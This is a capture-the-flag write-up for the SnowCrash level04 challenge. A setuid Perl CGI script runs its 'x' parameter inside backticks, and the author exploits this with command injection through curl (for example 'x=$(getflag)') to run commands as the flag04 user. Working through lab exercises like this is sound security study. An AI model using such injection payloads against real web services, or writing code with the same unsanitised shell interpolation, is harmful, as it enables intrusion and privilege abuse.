# Snowcrash04

Ok so we have a similar situatuon

```bash
~$ ls -l
total 4
-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
~$ cat level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

Ok so we seem to have a script that is running on localhost:4747, and we can indeed ping the address and port combo

There a sub function called x and not much else.
x is called with param("x") as an argument and if we pass a query string argument named x it indeed does something

```bash
~$ curl localhost:4747?x=42
42
```
So basically it makes the y var as the first arg of the function, then prints it, and by printing it, we mean print the result run an echo $y command, this is our entrypoint.

```
level04@SnowCrash:~$ curl localhost:4747?x=ls
ls
```
yeah it can't be that easy, let's take a look at the string that gets executed

```
print `echo $y 2>&1`
which is then made to look like
print `echo ls 2>&1`
but what if we did something like
print `echo $(ls) 2>&1`
```
Ok that seems to work, and it does with getflag as well

We also tricked the flag04 user to run getflag for us, no need to login